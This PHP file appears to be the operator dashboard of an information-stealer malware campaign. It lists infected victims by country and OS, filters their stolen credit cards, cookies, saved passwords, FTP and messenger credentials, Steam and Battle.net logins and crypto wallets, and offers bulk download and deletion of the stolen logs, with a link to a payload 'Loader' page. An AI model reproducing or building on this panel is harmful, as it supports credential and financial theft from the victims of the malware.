<?php
session_start();

require('mysql.php');
error_reporting(0);
function filter($norm, $arr){
	$quest = "SELECT * FROM `users` WHERE id > -1";
	
	foreach($norm['norm'] as $n){
		if($n=='cc'){ $quest.=' && cc > 0'; $arr['cc'] = 'checked';}
		if($n=='autof'){ $quest.=' && autof > 0'; $arr['autof'] = 'checked';}
		if($n=='cookies'){ $quest.=' && cookies > 0'; $arr['cookies'] = 'checked';}
		if($n=='filezilla'){ $quest.=' && filezilla > 0'; $arr['filezilla'] = 'checked';}
		if($n=='passwords'){ $quest.=' && passwords > 0'; $arr['passwords'] = 'checked';}
		if($n=='telegram'){ $quest.=' && telegram > 0'; $arr['telegram'] = 'checked';}
		if($n=='wallet'){ $quest.=' && wallet > 0'; $arr['wallet'] = 'checked';}
		if($n=='pidgin'){ $quest.=' && pidgin > 0'; $arr['pidgin'] = 'checked';}
		if($n=='psi'){ $quest.=' && psi > 0'; $arr['psi'] = 'checked';}
		if($n=='psiplus'){ $quest.=' && psiplus > 0'; $arr['psiplus'] = 'checked';}
		if($n=='steam'){ $quest.=' && steam > 0'; $arr['steam'] = 'checked';}
		if($n=='BattleNet'){ $quest.=' && BattleNet > 0'; $arr['BattleNet'] = 'checked';}
		if($n=='WINSCP'){ $quest.=' && WINSCP > 0'; $arr['WINSCP'] = 'checked';}
	}
	
	return array($quest, $arr);
}

if (isset($_SESSION["session_username"]))  {
		$arr = []; 
		$f = filter($_POST, $arr);
		$quest = $f[0];
		$arr = $f[1];
		
		if(isset($_GET['page'])){	
			$page = $_GET['page'];
		}else{
			$page = 1;
		}
		
		$inpu = '';
		foreach($arr as $key => $value){
			$inpu.= '<input type="hidden" id="'.$key.'" name="norm[]" value="'.$key.'"'.$value.'\>';
		}
		?>
<html>
<head>
<link href="https://bootswatch.com/4/superhero/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<link href="bootstrap.css" rel="stylesheet" id="bootstrap-css">
<!------ Include the above in your HEAD tag ---------->

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="http://getbootstrap.com/dist/js/bootstrap.min.js"></script>
</head>
<body>

<div class="sidenav">
  <a href="index.php">Log</a>
  <a href="statictic.php">Statistic</a>
  <a href="loader.php">Loader</a>
</div>

<div class="main">

	<form action="index.php?page=<?=$page?>" style="margin-bottom: -10px;" method="POST">
    <input type="checkbox" id="autof" name="norm[]" value="autof" <?=$arr['autof']?>/><label for="autof">AutoFill</label>   
    <input type="checkbox" id="cc" name="norm[]" value="cc" <?=$arr['cc']?>/><label for="cc">Credit Cards</label>   
    <input type="checkbox" id="cookies" name="norm[]" value="cookies" <?=$arr['cookies']?>/><label for="cookies">Cookies</label>   
    <input type="checkbox" id="filezilla" name="norm[]" value="filezilla" <?=$arr['filezilla']?>/><label for="filezilla">FileZilla</label>   
    <input type="checkbox" id="passwords" name="norm[]" value="passwords" <?=$arr['passwords']?>/><label for="passwords">Passwords</label>   
    <input type="checkbox" id="wallet" name="norm[]" value="wallet" <?=$arr['wallet']?>/><label for="wallet">Wallet.dat</label>   
    <input type="checkbox" id="pidgin" name="norm[]" value="pidgin" <?=$arr['pidgin']?>/><label for="pidgin">Pidgin</label>   
    <input type="checkbox" id="telegram" name="norm[]" value="telegram" <?=$arr['telegram']?>/><label for="telegram">Telegram</label>   
    <input type="checkbox" id="WINSCP" name="norm[]" value="WINSCP" <?=$arr['WINSCP']?>/><label for="WINSCP">WinScp</label>   
    <input type="checkbox" id="BattleNet" name="norm[]" value="BattleNet" <?=$arr['BattleNet']?>/><label for="BattleNet">Battle.net</label>   
    <input type="checkbox" id="steam" name="norm[]" value="steam" <?=$arr['steam']?>/><label for="steam">Steam</label>   
    <input type="checkbox" id="psi" name="norm[]" value="psi" <?=$arr['psi']?>/><label for="psi">Psi</label>   
    <input type="checkbox" id="psiplus" name="norm[]" value="psiplus" <?=$arr['psiplus']?>/><label for="psiplus">Psi+</label>   
    <button type="submit" class="btn btn-secondary" name="filter"/>Filter</button>
	</form>

	<form action="delete.php?page=<?=$page?>" style="display: inline;" method="POST">
				<button type="submit" class="btn btn-danger" name="all" value="">Remove all
				</button>
	</form>
			
	<form action="getfile.php?page=<?=$page?>" style="display: inline;" method="POST">
				<button type="submit" class="btn btn-primary" name="all" value="">Download all
				</button>
	</form>
	
	<form action="delete.php?page=<?=$page?>" style="display: inline;" method="POST">
				<?php echo $inpu; ?>
				<button type="submit" class="btn btn-danger" name="filter" value="">Remove filtered
				</button>
	</form>
			
	<form action="getfile.php?page=<?=$page?>" style="display: inline;" method="POST">
				<?php echo $inpu; ?>
				<button type="submit" class="btn btn-primary" name="filter" value="">Download filtered
				</button>
	</form>
	
	<table class="table table-bordred table-striped">
            <thead>
                   <th>Id</th>
                   <th>Country</th>
                   <th>OS Version</th>
                   <th>CC</th>
                   <th>AutoFill</th>
                   <th>Cookies</th>
                   <th>Passwords</th>
                   <th>WINSCP</th>
                   <th>BattleNet</th>
                   <th>Crypto</th>
                   <th>Logs</th>
                   <th>Action</th>
            </thead>
    <tbody>
    
	<?php
		
		$answer = $base->query($quest);
		$row = $answer->fetchAll();

		$output="";
		
		$pages = (int)(count($row)/64)+1;
		
		for($i = 64*($pages - $page)+63; $i>=64*($pages - $page); $i--){
			
			if(!isset($row[$i]['id'])){
				continue;
			}
			
			$output .= '<tr>
			<td>'.$i.'</td>
			<td>'.$row[$i]['country'].'</td>
			<td>'.$row[$i]['winver'].'</td>
			<td>'.$row[$i]['cc'].'</td>
			<td>'.$row[$i]['autof'].'</td>
			<td>'.$row[$i]['cookies'].'</td>
			<td>'.$row[$i]['passwords'].'</td>
			<td>'.$row[$i]['WINSCP'].'</td>
			<td>'.$row[$i]['BattleNet'].'</td>
			<td>'.$row[$i]['wallet'].'</td>
			
			<td>
				<form action="getfile.php" method="POST">
				<button type="submit" name="id" value="'.$row[$i]['id'].'" style="
				background: transparent;
				border: none !important;
				outline:none; ">
				<img src="./img/download.png"/>
			</button>
				
			</form>
			</td>
			
			<td>
				<form action="delete.php?page='.$page.'" method="POST">
				<button type="submit" name="id" value="'.$row[$i]['id'].'" style="
				background: transparent;
				border: none !important;
				outline:none; ">
				<img src="./img/trash.png"/>
				</button>
				
			</form>
			</td>
			
			</tr>';
						}
				   ?>
			<?=$output?>	   
		</tbody>
			</table>
				<div class="clearfix"></div>
				<ul class="pagination pull-right">
				  <li class="disabled"><a href="#"><span class="glyphicon glyphicon-chevron-left"></span></a></li>
				  
				  <?php
					$outpu="";
					for($i = 1; $i < $pages+1; $i++){
						
						if($page != $i){
							$outpu.= '<form action="index.php?page='.$i.'" method="POST">'.$inpu;
									
									$outpu.= '<button style="background-color: Transparent;
											background-repeat:no-repeat;
											border: none;
											cursor:pointer;
											overflow: hidden;" 
											type="submit" name="" value="filter" class="btn-link">'.$i.'</button>
									</form>';
						}else{
							$outpu.= '<form><button style="background-color: Transparent;
											background-repeat:no-repeat;
											border: none;
											cursor:pointer;
											overflow: hidden;" 
											type="submit" name="page" value="'.$i.'" class="btn-link">'.$i.'</button></form>';
							}
						
					}
				  ?>
				  
				<?=$outpu?>
				  
				  <li><a href="#"><span class="glyphicon glyphicon-chevron-right"></span></a></li>
				</ul>
</div>
</body>
</html>
<?php
}else{
	header("location: login.php");
}
?>